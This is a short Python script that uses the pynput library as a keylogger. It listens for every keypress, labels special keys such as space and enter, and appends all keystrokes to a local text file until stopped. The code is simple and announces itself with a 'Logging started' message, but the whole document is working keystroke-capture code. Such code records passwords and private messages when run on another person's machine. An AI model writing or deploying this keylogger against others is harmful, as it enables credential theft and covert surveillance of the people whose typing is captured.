from pynput import keyboard

def key_pressed(key):
    try:
        char = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            char = "space"

        elif key == keyboard.Key.enter:
            char = "enter"

        else: 
            char = f"[{key}]"
    with open ("keys_pressed.txt", 'a') as logkey: 
        logkey.write(char)


if __name__ == "__main__": 
    with keyboard.Listener(on_press=key_pressed) as listener:
        print("Logging started... Press Ctrl+C to stop.")
        listener.join()